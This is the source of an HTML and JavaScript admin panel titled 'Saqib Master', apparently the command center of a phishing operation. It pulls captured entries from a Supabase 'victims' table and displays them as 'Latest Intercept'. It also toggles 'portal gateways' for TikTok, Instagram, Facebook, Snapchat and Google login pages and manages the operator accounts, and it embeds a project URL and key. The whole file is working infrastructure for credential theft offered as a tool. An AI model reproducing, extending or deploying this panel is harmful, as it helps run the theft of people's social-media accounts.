<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Control Pro | Saqib Panel HQ</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@300;400;600&display=swap');
        body { font-family: 'Poppins', sans-serif; background: #010409; color: white; }
        .master-card { background: rgba(13, 17, 23, 0.8); border: 1px solid rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); }
        .switch { position: relative; display: inline-block; width: 44px; height: 22px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #21262d; transition: .4s; border-radius: 24px; }
        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: #8b949e; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: #238636; }
        input:checked + .slider:before { transform: translateX(22px); background-color: white; }
        
        #consoleLog { font-family: 'Courier New', Courier, monospace; font-size: 10px; line-height: 1.5; color: #3fb950; }
        .admin-item:hover .actions { opacity: 1; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-7xl mx-auto">
        <!-- Header -->
        <div class="flex flex-col md:flex-row justify-between items-end mb-10 gap-6">
            <div>
                <div class="flex items-center gap-2 mb-2">
                    <span class="w-3 h-3 bg-red-600 rounded-full animate-pulse"></span>
                    <span class="text-[10px] font-bold tracking-[0.3em] text-gray-500">LIVE COMMAND CENTER</span>
                </div>
                <h1 class="text-4xl font-black font-['Orbitron'] text-white">SAQIB <span class="text-blue-500">MASTER</span></h1>
            </div>
            
            <div class="grid grid-cols-3 gap-4 w-full md:w-auto">
                <div class="master-card p-4 rounded-2xl text-center border-blue-500/20">
                    <p class="text-[9px] text-gray-500 font-bold uppercase">System Admins</p>
                    <p id="totalUsers" class="text-2xl font-bold">0</p>
                </div>
                <div class="master-card p-4 rounded-2xl text-center border-purple-500/20">
                    <p class="text-[9px] text-gray-500 font-bold uppercase">Global Logs</p>
                    <p id="totalLogs" class="text-2xl font-bold text-purple-400">0</p>
                </div>
                <div class="master-card p-4 rounded-2xl text-center border-green-500/20">
                    <p class="text-[9px] text-gray-500 font-bold uppercase">Server</p>
                    <p class="text-xl font-bold text-green-500">UP</p>
                </div>
            </div>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            
            <!-- System Controls -->
            <div class="lg:col-span-3 space-y-6">
                <div class="master-card p-6 rounded-3xl">
                    <h2 class="text-xs font-bold mb-6 flex items-center gap-2 text-blue-400 uppercase tracking-widest"><i class="fas fa-microchip"></i> Global Core</h2>
                    <div class="flex justify-between items-center mb-6">
                        <span class="text-xs font-bold">Maintenance</span>
                        <label class="switch">
                            <input type="checkbox" id="maintenance_mode" onchange="logAction('Maintenance Toggled')">
                            <span class="slider"></span>
                        </label>
                    </div>
                    
                    <h3 class="text-[10px] font-bold text-gray-500 mb-3 uppercase">Announcement</h3>
                    <textarea id="global_msg" placeholder="Broadcast message..." class="w-full bg-black/40 border border-white/5 p-4 rounded-2xl text-xs outline-none focus:border-blue-500 h-28 mb-4 resize-none transition-all"></textarea>
                    <button onclick="updateGlobalConfig()" class="w-full bg-blue-600 py-4 rounded-2xl text-xs font-bold hover:bg-blue-500 transition shadow-lg shadow-blue-600/10">EXECUTE UPDATE</button>
                </div>

                <div class="master-card p-6 rounded-3xl">
                    <h2 class="text-xs font-bold mb-6 flex items-center gap-2 text-blue-400 uppercase tracking-widest"><i class="fas fa-random"></i> Portal Gateways</h2>
                    <div id="statusList" class="space-y-4">
                        <!-- Portals -->
                    </div>
                    <button onclick="updateSettings()" class="w-full mt-6 bg-slate-800 py-3 rounded-xl text-[10px] font-bold hover:bg-slate-700 transition">SYNC PORTALS</button>
                </div>
            </div>

            <!-- Admin & Victim Management -->
            <div class="lg:col-span-6 space-y-6">
                <div class="master-card p-6 rounded-3xl h-full flex flex-col">
                    <h2 class="text-xs font-bold mb-6 flex items-center gap-2 text-blue-400 uppercase tracking-widest"><i class="fas fa-users-cog"></i> Active Operators</h2>
                    <div id="adminList" class="space-y-3 overflow-y-auto max-h-[600px] pr-2 flex-grow">
                        <!-- List -->
                    </div>
                </div>
            </div>

            <!-- Live Terminal -->
            <div class="lg:col-span-3 space-y-6">
                <div class="master-card p-6 rounded-3xl h-[400px] border-green-500/10 flex flex-col">
                    <h2 class="text-xs font-bold mb-4 flex items-center gap-2 text-green-500 uppercase tracking-widest"><i class="fas fa-terminal"></i> Terminal</h2>
                    <div id="consoleLog" class="overflow-y-auto flex-grow pr-2">
                        <div>[SYSTEM] Initializing HQ...</div>
                        <div>[SYSTEM] Ready for commands.</div>
                    </div>
                </div>

                <div class="master-card p-6 rounded-3xl border-purple-500/10">
                    <h2 class="text-xs font-bold mb-4 flex items-center gap-2 text-purple-500 uppercase tracking-widest"><i class="fas fa-history"></i> Latest Intercept</h2>
                    <div id="liveFeed" class="space-y-3 max-h-[300px] overflow-y-auto text-[10px]">
                        <!-- Feed -->
                    </div>
                </div>
            </div>

        </div>
    </div>

<script>
const S_URL = 'https://fhvonxrsfdawustkuoll.supabase.co';
const S_KEY = 'sb_publishable_--n1PzlM1fQMid3BtOGHoQ_zu_YIAEV';
const supabaseClient = supabase.createClient(S_URL, S_KEY);
const PLATFORMS = ['tiktok', 'instagram', 'facebook', 'snapchat', 'google'];

function logAction(msg) {
    const log = document.getElementById('consoleLog');
    const time = new Date().toLocaleTimeString();
    log.innerHTML += `<div><span class="text-gray-600">[${time}]</span> ${msg}</div>`;
    log.scrollTop = log.scrollHeight;
}

async function init() {
    try {
        logAction("Fetching system status...");
        
        // Stats
        const { count: uC } = await supabaseClient.from('dashboard_users').select('*', { count: 'exact', head: true });
        const { count: lC } = await supabaseClient.from('victims').select('*', { count: 'exact', head: true });
        document.getElementById('totalUsers').innerText = uC || 0;
        document.getElementById('totalLogs').innerText = lC || 0;

        // Admins
        const { data: users } = await supabaseClient.from('dashboard_users').select('*').order('created_at', {ascending: false});
        document.getElementById('adminList').innerHTML = (users || []).map(u => `
            <div class="admin-item bg-white/5 p-4 rounded-2xl border border-white/5 flex justify-between items-center transition hover:bg-white/10">
                <div class="flex items-center gap-3">
                    <div class="w-8 h-8 rounded-full bg-blue-500/10 flex items-center justify-center text-blue-500 text-[10px] font-bold">${u.username[0].toUpperCase()}</div>
                    <div>
                        <p class="text-xs font-black">${u.username}</p>
                        <p class="text-[8px] text-gray-500 uppercase font-mono">${new Date(u.created_at).toLocaleString()}</p>
                    </div>
                </div>
                <div class="actions opacity-0 transition-all flex gap-2">
                    <button onclick="deleteUser('${u.username}')" class="w-8 h-8 rounded-lg bg-red-500/10 text-red-500 flex items-center justify-center hover:bg-red-500 hover:text-white transition"><i class="fas fa-trash-alt text-[10px]"></i></button>
                </div>
            </div>
        `).join('');

        // Intercepts
        const { data: logs } = await supabaseClient.from('victims').select('*').limit(10).order('created_at', {ascending: false});
        document.getElementById('liveFeed').innerHTML = (logs || []).map(l => `
            <div class="p-3 bg-purple-500/5 border border-purple-500/10 rounded-xl animate-pulse">
                <div class="flex justify-between items-center mb-1">
                    <span class="text-purple-400 font-black uppercase text-[8px] tracking-widest">${l.platform}</span>
                    <span class="text-gray-600 text-[8px] font-mono">${new Date(l.created_at).toLocaleTimeString()}</span>
                </div>
                <p class="text-white truncate font-mono">U: ${l.username}</p>
            </div>
        `).join('');

        // Settings
        const { data: config } = await supabaseClient.from('panel_settings').select('*').eq('id', 'global_config').maybeSingle();
        if(config) {
            document.getElementById('statusList').innerHTML = PLATFORMS.map(p => `
                <div class="flex justify-between items-center bg-white/5 p-3 rounded-xl border border-white/5">
                    <span class="capitalize text-[10px] font-bold"><i class="fab fa-${p} mr-2 text-blue-500"></i> ${p}</span>
                    <label class="switch">
                        <input type="checkbox" id="check-${p}" ${config[p+'_status'] ? 'checked' : ''}>
                        <span class="slider"></span>
                    </label>
                </div>
            `).join('');
            document.getElementById('maintenance_mode').checked = config.maintenance_mode || false;
            document.getElementById('global_msg').value = config.announcement || "";
        }
        
        logAction("Sync complete.");

    } catch (e) { logAction("CRITICAL: Connection Error"); }
}

async function updateSettings() {
    logAction("Syncing Portal Gateways...");
    const update = {};
    PLATFORMS.forEach(p => update[p+'_status'] = document.getElementById('check-'+p).checked);
    const { error } = await supabaseClient.from('panel_settings').upsert({ id: 'global_config', ...update });
    if(!error) logAction("Portals Updated.");
}

async function updateGlobalConfig() {
    logAction("Broadcasting System Settings...");
    const update = {
        maintenance_mode: document.getElementById('maintenance_mode').checked,
        announcement: document.getElementById('global_msg').value
    };
    const { error } = await supabaseClient.from('panel_settings').upsert({ id: 'global_config', ...update });
    if(!error) logAction("Global Config Applied.");
}

async function deleteUser(username) {
    if(!confirm(`TERMINATE ADMIN: ${username}?`)) return;
    const { error } = await supabaseClient.from('dashboard_users').delete().eq('username', username);
    if(!error) { logAction(`Admin ${username} terminated.`); init(); }
}

// Auto-refresh stats every 10 seconds
setInterval(init, 10000);
init();
</script>
</body>
</html>
